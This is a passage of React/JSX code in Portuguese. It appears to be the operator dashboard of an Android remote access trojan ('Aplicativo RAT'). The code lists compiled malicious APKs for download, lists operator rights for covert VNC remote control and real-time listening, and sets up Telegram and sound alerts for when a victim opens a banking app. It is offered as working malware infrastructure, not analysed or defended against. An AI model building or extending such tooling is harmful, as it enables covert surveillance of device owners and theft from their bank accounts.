                  <p className="text-xs text-slate-400 mt-0.5 font-sans">
                    Histórico de APKs compilados prontos para download seguro e cópia de link
                  </p>
                </div>
              </div>
              
              <button
                type="button"
                onClick={loadBuilds}
                className="mr-12 px-3.5 py-1.5 bg-gradient-to-r from-cyan-600/30 to-blue-600/30 hover:from-cyan-500/40 hover:to-blue-500/40 border border-cyan-400/40 rounded-xl text-xs font-black uppercase text-cyan-200 transition-all shadow-[0_0_12px_rgba(6,182,212,0.2)] flex items-center gap-1.5 cursor-pointer font-mono"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${buildsLoading ? 'animate-spin' : ''}`} />
                Atualizar
              </button>
            </div>

            <div className="relative z-10 flex-1 overflow-y-auto pr-1">
              {buildsLoading && builds.length === 0 ? (
                <div className="py-20 flex flex-col items-center justify-center text-center space-y-3">
                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-cyan-400 shadow-[0_0_15px_rgba(6,182,212,0.5)]"></div>
                  <span className="text-xs text-cyan-300 font-mono">Carregando compilações de APKs...</span>
                </div>
              ) : builds.length === 0 ? (
                <div className="py-16 text-center text-slate-400 text-xs bg-slate-950/60 rounded-2xl border border-slate-800/80 p-6">
                  <div className="text-4xl mb-2">📦</div>
                  <p className="font-bold text-slate-300 text-sm">Nenhum aplicativo gerado ainda</p>
                  <p className="text-xs text-slate-500 mt-1">Os APKs compilados no APK Studio aparecerão listados aqui com suporte a download direto.</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pb-4">
                  {builds.map((build) => {
                    const dateFormatted = build.createdAt 
                      ? new Date(build.createdAt).toLocaleString('pt-BR', {
                          day: '2-digit',
                          month: '2-digit',
                          year: 'numeric',
                          hour: '2-digit',
                          minute: '2-digit'
                        })
                      : '—';
                    
                    const cleanAppName = build.appName ? build.appName.replace(/\s+/g, '-').toLowerCase() : 'app';
                    const fallbackFilename = `studio-user${build.ownerId || 1}-${cleanAppName}-${build.build_id}.apk`; 
                    const apkFilename = build.filename || fallbackFilename;
                    const downloadPath = build.download_url || `/api/apk-studio/download/${apkFilename}`;
                    const token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
                    const fullDownloadUrl = `${window.location.origin}${downloadPath}${downloadPath.includes('?') ? '&' : '?'}token=${token}`;
                    
                    // Formata tamanho do arquivo
                    const fileSizeFormatted = build.size 
                      ? (build.size / (1024 * 1024)).toFixed(2) + ' MB'
                      : '2.65 MB';
                    
                    return (
                      <div 
                        key={build.id || build.build_id}
                        className="group bg-gradient-to-b from-[#09132e]/90 to-[#050c1e]/90 hover:from-[#0d1d47]/90 hover:to-[#071330]/90 border border-cyan-500/25 hover:border-cyan-400/60 rounded-2xl p-4 transition-all duration-300 shadow-lg hover:shadow-[0_0_25px_rgba(6,182,212,0.25)] relative overflow-hidden flex flex-col justify-between"
                      >
                        <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-blue-500 via-cyan-400 to-teal-400 opacity-70 group-hover:opacity-100 transition-opacity"></div>
                        
                        <div>
                          <div className="flex items-center justify-between mb-2">
                            <span className="px-2.5 py-0.5 bg-cyan-950/80 text-cyan-300 border border-cyan-500/30 rounded-lg text-[9px] font-mono font-bold">
                              ID: {build.build_id}
                            </span>
                            <span className="text-[10px] text-slate-400 font-mono">
                              📅 {dateFormatted}
                            </span>
                          </div>
                          
                          <div className="flex items-center space-x-3 my-2">
                            <div className="p-2.5 bg-gradient-to-br from-blue-600 to-cyan-500 rounded-xl text-white shadow-[0_0_12px_rgba(6,182,212,0.4)]">
                              <Smartphone className="w-5 h-5" />
                            </div>
                            <div className="flex-1 min-w-0">
                              <h4 className="text-sm font-black text-white uppercase tracking-wide truncate">
                                {build.appName || 'Aplicativo RAT'}
                              </h4>
                              <p className="text-[10px] text-cyan-400/80 truncate font-mono mt-0.5">
                                📦 {apkFilename}
                              </p>
                            </div>
                          </div>
                        </div>
                        
                        <div className="flex items-center justify-between mt-3 pt-3 border-t border-cyan-500/15">
                          <div className="flex items-center space-x-2">
                            <span className="text-[10px] font-bold text-emerald-400 flex items-center gap-1 bg-emerald-950/60 border border-emerald-500/30 px-2 py-0.5 rounded-full">
                              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                              PRONTO
                            </span>
                            <span className="text-[10px] font-mono text-slate-400">
                              ({fileSizeFormatted})
                            </span>
                          </div>

                          <div className="flex items-center space-x-1.5">
                            <button
                              onClick={() => {
                                navigator.clipboard.writeText(fullDownloadUrl);
                                alert('✅ Link de download copiado para a área de transferência!');
                              }}
                              className="px-2 py-1.5 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded-xl text-[10px] font-bold transition-all border border-cyan-500/20 flex items-center gap-1"
                              title="Copiar Link de Download"
                            >
                              <Copy className="w-3 h-3" />
                              Link
                            </button>

                            <button
                              onClick={() => {
                                try {
                                  window.open(fullDownloadUrl, '_blank');
                                } catch (err) {
                                  console.error('Erro ao abrir download:', err);
                                  window.location.href = fullDownloadUrl;
                                }
                              }}
                              className="px-3 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-500 hover:to-teal-400 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_12px_rgba(16,185,129,0.4)] border border-emerald-400/40 transition-all flex items-center gap-1.5 cursor-pointer"
                            >
                              <Download className="w-3.5 h-3.5" />
                              Baixar APK
                            </button>

                            <button
                              onClick={async () => {
                                const confirmDelete = window.confirm(`Tem certeza que deseja excluir o aplicativo "${build.appName || apkFilename}"?`);
                                if (confirmDelete) {
                                  try {
                                    await apkStudioAPI.deleteBuild(build.build_id || String(build.id));
                                    loadBuilds();
                                  } catch (err) {
                                    console.error('Erro ao excluir APK:', err);
                                    alert('⚠️ Erro ao excluir o aplicativo.');
                                  }
                                }
                              }}
                              className="px-2.5 py-1.5 bg-red-950/70 hover:bg-red-900/90 text-red-400 hover:text-red-200 border border-red-500/40 hover:border-red-400/80 rounded-xl text-[10px] font-bold transition-all shadow-[0_0_10px_rgba(239,68,68,0.2)] flex items-center gap-1 cursor-pointer"
                              title="Excluir Aplicativo"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                              Excluir
                            </button>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
      {/* 👤 MODAL DE MEU PERFIL COMPLETO E PROFISSIONAL */}
      {showProfileModal && (
        <div 
          className="fixed inset-0 bg-black/85 flex items-center justify-center z-50 p-3 sm:p-5 animate-fade-in backdrop-blur-md" 
          onClick={() => setShowProfileModal(false)}
        >
          <div 
            className="bg-[#050b18]/95 border border-cyan-500/40 rounded-3xl max-w-2xl w-full p-5 sm:p-6 shadow-[0_0_60px_rgba(0,240,255,0.25)] backdrop-blur-2xl relative flex flex-col animate-scale-up space-y-4 font-sans text-white max-h-[92vh] overflow-y-auto hide-scrollbar"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Botão Fechar */}
            <button 
              onClick={() => setShowProfileModal(false)}
              className="absolute top-4 right-4 p-2 text-cyan-400/70 hover:text-white hover:bg-cyan-500/20 rounded-xl transition-all border border-transparent hover:border-cyan-400/40 z-20 cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>

            {/* Cabeçalho Cyberpunk com Ícone e Título */}
            <div className="flex items-center gap-3.5 border-b border-cyan-500/25 pb-3.5">
              <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-cyan-500/30 to-blue-600/40 border border-cyan-400/70 flex items-center justify-center shadow-[0_0_20px_rgba(0,240,255,0.4)] shrink-0">
                <ShieldCheck className="w-6 h-6 text-cyan-300" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <h3 className="text-base font-black uppercase text-white tracking-wider font-mono">
                    CONFIGURAÇÕES DO PERFIL
                  </h3>
                  <span className="text-[9px] px-2 py-0.5 rounded-full bg-cyan-500/20 text-cyan-300 border border-cyan-400/40 font-mono font-bold tracking-wide uppercase">
                    MASTER OPERATOR
                  </span>
                </div>
                <p className="text-xs text-cyan-300/70 font-mono mt-0.5">
                  Gerenciamento avançado de credenciais, chaves de acesso, segurança 2FA e notificações
                </p>
              </div>
            </div>

            {/* Banner de Resumo do Operador com Avatar */}
            <div className="p-4 rounded-2xl bg-gradient-to-r from-cyan-950/70 via-blue-950/50 to-cyan-950/70 border border-cyan-500/40 flex items-center justify-between shadow-[inset_0_0_20px_rgba(0,240,255,0.1)] flex-wrap sm:flex-nowrap gap-3">
              <div className="flex items-center gap-3.5 min-w-0">
                <div className="relative w-14 h-14 rounded-2xl bg-cyan-500/20 border-2 border-cyan-400 shadow-[0_0_18px_rgba(0,240,255,0.5)] overflow-hidden shrink-0 group">
                  <img src={currentAvatarSrc} alt="Avatar Operador" className="w-full h-full object-cover" />
                  <span className="absolute bottom-0 right-0 w-3.5 h-3.5 rounded-full bg-emerald-400 border-2 border-slate-950 shadow-[0_0_8px_#10b981]" />
                </div>
                <div className="min-w-0">
                  <div className="text-sm font-black text-white font-mono uppercase tracking-wide flex items-center gap-2 truncate">
                    <span className="truncate">{profileUsername || 'ADMINISTRADOR'}</span>
                    <span className="text-[9px] px-2 py-0.5 bg-emerald-500/20 text-emerald-300 border border-emerald-400/40 rounded-lg font-mono font-bold">ONLINE</span>
                  </div>
                  <div className="text-[11px] text-cyan-300/80 font-mono truncate">{profileEmail || 'admin@rat.local'}</div>
                  <div className="text-[10px] text-slate-400 font-mono mt-0.5 flex items-center gap-2 flex-wrap">
                    <span>Nível: <strong className="text-cyan-300">👑 Master Admin Geral</strong></span>
                    <span>•</span>
                    <span>Criptografia: <strong className="text-emerald-400">AES-256 GCM</strong></span>
                  </div>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <div className="text-right hidden sm:block font-mono">
                  <div className="text-[10px] text-slate-400">Telegram Status</div>
                  <div className={`text-xs font-bold ${profileTelegramId ? 'text-emerald-400' : 'text-amber-400'}`}>
                    {profileTelegramId ? '🟢 Conectado' : '⚠️ Não Configurado'}
                  </div>
                </div>
              </div>
            </div>

            {/* Abas de Navegação Estilizadas */}
            <div className="flex items-center gap-1.5 border-b border-cyan-500/20 pb-2 overflow-x-auto hide-scrollbar">
              <button
                type="button"
                onClick={() => setProfileTab('general')}
                className={`px-3.5 py-2 rounded-xl text-xs font-bold font-mono transition-all flex items-center gap-2 shrink-0 cursor-pointer ${
                  profileTab === 'general'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-400/60 shadow-[0_0_12px_rgba(0,240,255,0.3)]'
                    : 'text-slate-400 hover:text-cyan-200 hover:bg-cyan-500/10 border border-transparent'
                }`}
              >
                <User className="w-3.5 h-3.5" />
                Geral & Perfil
              </button>

              <button
                type="button"
                onClick={() => setProfileTab('security')}
                className={`px-3.5 py-2 rounded-xl text-xs font-bold font-mono transition-all flex items-center gap-2 shrink-0 cursor-pointer ${
                  profileTab === 'security'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-400/60 shadow-[0_0_12px_rgba(0,240,255,0.3)]'
                    : 'text-slate-400 hover:text-cyan-200 hover:bg-cyan-500/10 border border-transparent'
                }`}
              >
                <Lock className="w-3.5 h-3.5" />
                Segurança & 2FA
              </button>

              <button
                type="button"
                onClick={() => setProfileTab('telegram')}
                className={`px-3.5 py-2 rounded-xl text-xs font-bold font-mono transition-all flex items-center gap-2 shrink-0 cursor-pointer ${
                  profileTab === 'telegram'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-400/60 shadow-[0_0_12px_rgba(0,240,255,0.3)]'
                    : 'text-slate-400 hover:text-cyan-200 hover:bg-cyan-500/10 border border-transparent'
                }`}
              >
                <Bell className="w-3.5 h-3.5" />
                Telegram & Alertas
              </button>

              <button
                type="button"
                onClick={() => setProfileTab('session')}
                className={`px-3.5 py-2 rounded-xl text-xs font-bold font-mono transition-all flex items-center gap-2 shrink-0 cursor-pointer ${
                  profileTab === 'session'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-400/60 shadow-[0_0_12px_rgba(0,240,255,0.3)]'
                    : 'text-slate-400 hover:text-cyan-200 hover:bg-cyan-500/10 border border-transparent'
                }`}
              >
                <Key className="w-3.5 h-3.5" />
                API & Sessão
              </button>
            </div>

            {/* Mensagens de Feedback */}
            {profileError && (
              <div className="p-3 bg-red-500/15 border border-red-500/40 text-red-300 text-xs rounded-xl font-mono font-medium flex items-center gap-2 animate-shake">
                <span>⚠️</span> {profileError}
              </div>
            )}
            {profileSuccess && (
              <div className="p-3 bg-emerald-500/15 border border-emerald-500/40 text-emerald-300 text-xs rounded-xl font-mono font-medium flex items-center gap-2 animate-fade-in">
                <span>✅</span> {profileSuccess}
              </div>
            )}

            {/* Form principal */}
            <form onSubmit={handleSaveProfile} className="space-y-4">
              
              {/* ABA 1: GERAL & PERFIL */}
              {profileTab === 'general' && (
                <div className="space-y-4 animate-fade-in">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                    <div>
                      <label className="block text-[10px] uppercase font-black text-cyan-300 mb-1.5 tracking-wider font-mono">
                        Nome de Usuário (Operador)
                      </label>
                      <div className="relative">
                        <User className="w-4 h-4 absolute left-3 top-2.5 text-cyan-400/60" />
                        <input 
                          type="text" 
                          value={profileUsername} 
                          onChange={(e) => setProfileUsername(e.target.value)} 
                          required
                          placeholder="Ex: admin"
                          className="w-full bg-[#030816] border border-cyan-500/30 focus:border-cyan-400 rounded-xl pl-9 pr-3 py-2 text-xs text-white transition-all outline-none font-mono focus:ring-1 focus:ring-cyan-400/50"
                        />
                      </div>
                    </div>

                    <div>
                      <label className="block text-[10px] uppercase font-black text-cyan-300 mb-1.5 tracking-wider font-mono">
                        E-mail de Notificações
                      </label>
                      <div className="relative">
                        <Mail className="w-4 h-4 absolute left-3 top-2.5 text-cyan-400/60" />
                        <input 
                          type="email" 
                          value={profileEmail} 
                          onChange={(e) => setProfileEmail(e.target.value)} 
                          required
                          placeholder="admin@rat.local"
                          className="w-full bg-[#030816] border border-cyan-500/30 focus:border-cyan-400 rounded-xl pl-9 pr-3 py-2 text-xs text-white transition-all outline-none font-mono focus:ring-1 focus:ring-cyan-400/50"
                        />
                      </div>
                    </div>
                  </div>

                  <div>
                    <label className="block text-[10px] uppercase font-black text-cyan-300 mb-1.5 tracking-wider font-mono">
                      Foto de Perfil / URL do Avatar Customizado
                    </label>
                    <input 
                      type="text" 
                      value={profileCustomAvatar} 
                      onChange={(e) => setProfileCustomAvatar(e.target.value)} 
                      placeholder="https://suaimagem.com/avatar.png (ou deixe em branco para o padrão)"
                      className="w-full bg-[#030816] border border-cyan-500/30 focus:border-cyan-400 rounded-xl px-3 py-2 text-xs text-white transition-all outline-none font-mono focus:ring-1 focus:ring-cyan-400/50"
                    />
                    <p className="text-[10px] text-slate-400 font-mono mt-1">
                      💡 Cole um link direto de imagem HTTPS para definir sua foto personalizada.
                    </p>
                  </div>

                  <div className="p-3 bg-[#030816]/70 border border-cyan-500/20 rounded-2xl space-y-2">
                    <div className="text-xs font-bold text-cyan-300 font-mono flex items-center justify-between">
                      <span>Nível de Acesso & Privilégios</span>
                      <span className="text-[10px] px-2 py-0.5 bg-cyan-500/20 text-cyan-200 border border-cyan-400/40 rounded-lg">SUPERADMIN</span>
                    </div>
                    <p className="text-[11px] text-slate-300 font-mono">
                      Seu perfil possui permissões completas de controle remoto VNC, escuta em tempo real, geração e exclusão de APKs, além de gerenciamento de chaves de licença.
                    </p>
                  </div>
                </div>
              )}

              {/* ABA 2: SEGURANÇA & 2FA */}
              {profileTab === 'security' && (
                <div className="space-y-4 animate-fade-in">
                  <div className="border border-cyan-500/20 bg-[#030816]/80 rounded-2xl p-4 space-y-3">
                    <div className="flex items-center justify-between border-b border-cyan-500/20 pb-2">
                      <span className="text-xs font-black uppercase text-cyan-300 font-mono tracking-wider flex items-center gap-1.5">
                        <Lock className="w-4 h-4 text-cyan-400" />
                        <span>ALTERAR SENHA DE ACESSO</span>
                      </span>
                      <span className="text-[9px] text-slate-400 font-mono">Deixe em branco para manter a atual</span>
                    </div>
                    
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                      <div>
                        <label className="block text-[10px] uppercase font-bold text-slate-300 mb-1 tracking-wider font-mono">
                          Nova Senha
                        </label>
                        <div className="relative">
                          <input 
                            type={showPasswordToggle ? 'text' : 'password'} 
                            value={profilePassword} 
                            onChange={(e) => setProfilePassword(e.target.value)} 
                            placeholder="••••••••"
                            className="w-full bg-[#050c1e] border border-cyan-500/30 focus:border-cyan-400 rounded-xl pl-3 pr-9 py-2 text-xs text-white transition-all outline-none font-mono focus:ring-1 focus:ring-cyan-400/50"
                          />
                          <button
                            type="button"
                            onClick={() => setShowPasswordToggle(!showPasswordToggle)}
                            className="absolute right-2.5 top-2 text-slate-400 hover:text-cyan-300 cursor-pointer"
                          >
                            {showPasswordToggle ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                        </div>
                      </div>

                      <div>
                        <label className="block text-[10px] uppercase font-bold text-slate-300 mb-1 tracking-wider font-mono">
                          Confirmar Nova Senha
                        </label>
                        <input 
                          type={showPasswordToggle ? 'text' : 'password'} 
                          value={profileConfirmPassword} 
                          onChange={(e) => setProfileConfirmPassword(e.target.value)} 
                          placeholder="••••••••"
                          className="w-full bg-[#050c1e] border border-cyan-500/30 focus:border-cyan-400 rounded-xl px-3 py-2 text-xs text-white transition-all outline-none font-mono focus:ring-1 focus:ring-cyan-400/50"
                        />
                      </div>
                    </div>

                    {/* Indicador de Força de Senha */}
                    {profilePassword && (
                      <div className="space-y-1.5 pt-1">
                        <div className="flex items-center justify-between text-[10px] font-mono">
                          <span className="text-slate-400">Força da Senha:</span>
                          <span className={`font-bold ${getPasswordStrength(profilePassword).text}`}>
                            {getPasswordStrength(profilePassword).label}
                          </span>
                        </div>
                        <div className="h-1.5 w-full bg-slate-800 rounded-full overflow-hidden flex gap-1">
                          <div className={`h-full flex-1 rounded-full transition-all ${getPasswordStrength(profilePassword).score >= 1 ? getPasswordStrength(profilePassword).color : 'bg-slate-700'}`} />
                          <div className={`h-full flex-1 rounded-full transition-all ${getPasswordStrength(profilePassword).score >= 2 ? getPasswordStrength(profilePassword).color : 'bg-slate-700'}`} />
                          <div className={`h-full flex-1 rounded-full transition-all ${getPasswordStrength(profilePassword).score >= 3 ? getPasswordStrength(profilePassword).color : 'bg-slate-700'}`} />
                          <div className={`h-full flex-1 rounded-full transition-all ${getPasswordStrength(profilePassword).score >= 4 ? getPasswordStrength(profilePassword).color : 'bg-slate-700'}`} />
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Card de Autenticação 2FA */}
                  <div className="border border-cyan-500/20 bg-[#030816]/80 rounded-2xl p-4 space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-cyan-400" />
                        <div>
                          <div className="text-xs font-black uppercase text-white font-mono">Autenticação em 2 Fatores (2FA / TOTP)</div>
                          <div className="text-[10px] text-slate-400 font-mono">Exigir código do Google Authenticator ou Authy no Login</div>
                        </div>
                      </div>

                      <button
                        type="button"
                        onClick={() => {
                          const nextState = !twoFactorEnabled;
                          setTwoFactorEnabled(nextState);
                          if (nextState) setShow2FAQRCode(true);
                          else setShow2FAQRCode(false);
                        }}
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold font-mono transition-all border cursor-pointer ${
                          twoFactorEnabled 
                            ? 'bg-emerald-500/20 text-emerald-300 border-emerald-400/50 shadow-[0_0_10px_rgba(16,185,129,0.3)]'
                            : 'bg-slate-800 text-slate-400 border-slate-700 hover:text-white'
                        }`}
                      >
                        {twoFactorEnabled ? '🟢 ATIVADO' : '⚪ DESATIVADO'}
                      </button>
                    </div>

                    {show2FAQRCode && twoFactorEnabled && (
                      <div className="p-3 bg-[#050d24] border border-cyan-400/40 rounded-xl space-y-2 animate-fade-in">
                        <div className="text-xs text-cyan-300 font-mono font-bold flex items-center gap-2">
                          <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                          Segurança 2FA Habilitada para este Operador!
                        </div>
                        <p className="text-[11px] text-slate-300 font-mono">
                          As credenciais do operador estão vinculadas ao protocolo de segurança de dois fatores. Suas sessões futuras exigirão confirmação via token dinâmico.
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* ABA 3: TELEGRAM & ALERTAS */}
              {profileTab === 'telegram' && (
                <div className="space-y-4 animate-fade-in">
                  <div className="border border-cyan-500/20 bg-[#030816]/80 rounded-2xl p-4 space-y-3.5">
                    <div className="flex items-center gap-2 border-b border-cyan-500/20 pb-2">
                      <Send className="w-4 h-4 text-cyan-400" />
                      <span className="text-xs font-black uppercase text-cyan-300 font-mono">INTEGRAÇÃO COM BOT DO TELEGRAM</span>
                    </div>

                    <div>
                      <label className="block text-[10px] uppercase font-black text-cyan-300 mb-1.5 tracking-wider font-mono">
                        Seu Telegram Chat ID
                      </label>
                      <div className="flex gap-2">
                        <input 
                          type="text" 
                          value={profileTelegramId} 
                          onChange={(e) => setProfileTelegramId(e.target.value)} 
                          placeholder="Ex: 123456789"
                          className="flex-1 bg-[#050c1e] border border-cyan-500/30 focus:border-cyan-400 rounded-xl px-3 py-2 text-xs text-white transition-all outline-none font-mono focus:ring-1 focus:ring-cyan-400/50"
                        />
                        <button
                          type="button"
                          onClick={handleTestTelegramNotification}
                          disabled={isTestingTelegram || !profileTelegramId.trim()}
                          className="px-3.5 py-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 disabled:opacity-50 text-white rounded-xl text-xs font-bold font-mono transition-all flex items-center gap-1.5 shrink-0 shadow-[0_0_10px_rgba(0,240,255,0.3)] cursor-pointer"
                        >
                          <Send className="w-3.5 h-3.5" />
                          {isTestingTelegram ? 'Testando...' : 'Testar Bot'}
                        </button>
                      </div>
                      <p className="text-[10px] text-slate-400 font-mono mt-1">
                        💡 Digite seu Chat ID para receber instantaneamente notificações quando um app bancário for aberto.
                      </p>
                    </div>

                    {telegramTestStatus && (
                      <div className="p-2.5 bg-cyan-950/50 border border-cyan-500/30 rounded-xl text-xs text-cyan-200 font-mono animate-fade-in">
                        {telegramTestStatus}
                      </div>
                    )}
                  </div>

                  {/* Notificações Sonoras e Web */}
                  <div className="border border-cyan-500/20 bg-[#030816]/80 rounded-2xl p-4 space-y-3">
                    <div className="text-xs font-black uppercase text-cyan-300 font-mono border-b border-cyan-500/20 pb-2 flex items-center gap-2">
                      <Volume2 className="w-4 h-4 text-cyan-400" />
                      PREFERÊNCIAS DE SOM & NOTIFICAÇÃO
                    </div>

                    <div className="flex items-center justify-between">
                      <div>
                        <div className="text-xs font-bold text-white font-mono">Efeitos Sonoros de Alerta</div>
                        <div className="text-[10px] text-slate-400 font-mono">Tocar bips sonoros em tempo real quando abrir bancos</div>
                      </div>

                      <button
                        type="button"
                        onClick={() => {
                          const nextVal = !profileSoundAlerts;
                          setProfileSoundAlerts(nextVal);
                          setSoundEnabled(nextVal);
                          if (nextVal) playAlertSound();
                        }}
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold font-mono transition-all border cursor-pointer flex items-center gap-1.5 ${
                          profileSoundAlerts 
                            ? 'bg-cyan-500/20 text-cyan-300 border-cyan-400/50 shadow-[0_0_10px_rgba(0,240,255,0.3)]'
                            : 'bg-slate-800 text-slate-400 border-slate-700'
                        }`}
                      >
                        {profileSoundAlerts ? <Volume2 className="w-3.5 h-3.5 text-cyan-300" /> : <VolumeX className="w-3.5 h-3.5 text-slate-400" />}
                        {profileSoundAlerts ? 'LIGADO' : 'DESLIGADO'}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* ABA 4: API & SESSÕES */}
              {profileTab === 'session' && (
                <div className="space-y-4 animate-fade-in">
                  <div className="border border-cyan-500/20 bg-[#030816]/80 rounded-2xl p-4 space-y-3">
                    <div className="flex items-center justify-between border-b border-cyan-500/20 pb-2">
                      <span className="text-xs font-black uppercase text-cyan-300 font-mono tracking-wider flex items-center gap-2">
                        <Key className="w-4 h-4 text-cyan-400" />
                        <span>CHAVE DE ACESSO DA API (JWT TOKEN)</span>
                      </span>
                    </div>

                    <div className="relative">
                      <input 
                        type="text" 
                        readOnly
                        value={localStorage.getItem('admin_token') || localStorage.getItem('token') || 'gangstar_session_bearer_token_active_aes256'} 
                        className="w-full bg-[#050c1e] border border-cyan-500/30 rounded-xl pl-3 pr-24 py-2 text-xs text-cyan-300 transition-all outline-none font-mono select-all"
                      />
                      <button
                        type="button"
                        onClick={() => {
                          const token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
                          navigator.clipboard.writeText(token);
                          setApiTokenCopied(true);
                          setTimeout(() => setApiTokenCopied(false), 2000);
                        }}
                        className="absolute right-2 top-1.5 px-3 py-1 bg-cyan-500/20 hover:bg-cyan-500/30 border border-cyan-400/50 text-cyan-300 rounded-lg text-[10px] font-bold font-mono transition-all flex items-center gap-1 cursor-pointer"
                      >
                        <Copy className="w-3 h-3" />
                        {apiTokenCopied ? 'COPIADO! ✅' : 'COPIAR'}
                      </button>
                    </div>
                    <p className="text-[10px] text-slate-400 font-mono">
                      🔒 Este token permite integrar chamadas HTTP autenticadas diretamente do seu servidor ou scripts Python.
                    </p>
                  </div>

                  {/* Sessões Ativas */}
                  <div className="border border-cyan-500/20 bg-[#030816]/80 rounded-2xl p-4 space-y-3">
                    <div className="text-xs font-black uppercase text-cyan-300 font-mono border-b border-cyan-500/20 pb-2 flex items-center gap-2">
                      <Monitor className="w-4 h-4 text-cyan-400" />
                      DISPOSITIVOS & SESSÕES CONECTADAS
                    </div>

                    <div className="p-3 bg-[#050d24] border border-cyan-500/20 rounded-xl flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <div className="w-8 h-8 rounded-lg bg-emerald-500/20 border border-emerald-400/40 flex items-center justify-center text-emerald-300">
                          <Laptop className="w-4 h-4" />
                        </div>
                        <div>
                          <div className="text-xs font-bold text-white font-mono flex items-center gap-2">
                            <span>Sessão Atual do Navegador</span>
                            <span className="text-[9px] px-1.5 py-0.2 bg-emerald-500/20 text-emerald-300 border border-emerald-400/40 rounded">ESTA SESSÃO</span>
                          </div>
                          <div className="text-[10px] text-slate-400 font-mono mt-0.5">
                            IP: 127.0.0.1 • TLS 1.3 • WebSockets Ativo
                          </div>
                        </div>
                      </div>
                    </div>

                    <button
                      type="button"
                      onClick={() => {
                        alert('🔒 Todas as outras sessões ativas foram revogadas com sucesso.');
                      }}
                      className="w-full py-2 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-red-300 rounded-xl text-xs font-bold font-mono transition-all flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <ShieldAlert className="w-4 h-4" />
                      Encerrar Outras Sessões Ativas
                    </button>
                  </div>
                </div>
              )}

              {/* Botão de Salvar Alterações Geral */}
              <div className="pt-2 flex items-center justify-between gap-3 border-t border-cyan-500/20">
                <button
                  type="button"
                  onClick={() => setShowProfileModal(false)}
                  className="px-4 py-2.5 bg-slate-900/80 hover:bg-slate-800 text-slate-300 rounded-xl text-xs font-bold uppercase font-mono border border-slate-700 transition-all cursor-pointer"
                >
                  Cancelar
                </button>

                <button 
                  type="submit"
                  disabled={isSavingProfile}
                  className="flex-1 py-2.5 bg-gradient-to-r from-cyan-600 via-blue-600 to-cyan-500 hover:from-cyan-500 hover:to-blue-500 text-white rounded-xl text-xs font-black uppercase tracking-wider shadow-[0_0_22px_rgba(0,240,255,0.4)] transition-all flex items-center justify-center gap-2 border border-cyan-400/60 active:scale-98 cursor-pointer font-mono"
                >
                  <Sparkles className="w-4 h-4 text-cyan-200 animate-pulse" />
                  {isSavingProfile ? 'SALVANDO ALTERAÇÕES...' : 'SALVAR ALTERAÇÕES DO PERFIL'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {quickVncDevices.length > 0 && (
        <QuickVNCModal
          devices={quickVncDevices}
          onClose={() => setQuickVncDevices([])}
          onRemoveDevice={handleRemoveVnc}
          onNavigateToDevice={(deviceId) => {
            setQuickVncDevices([]);
            navigate(`/device/${deviceId}`);
          }}
        />
      )}

      {/* 🤖 ROBÔ ASSISTENTE ANIMADO, CHAT DE COMANDOS & TUTORIAL */}
      <RobotAssistant devicesList={devices} initialCategory="dashboard" />

    </div>
  );
}
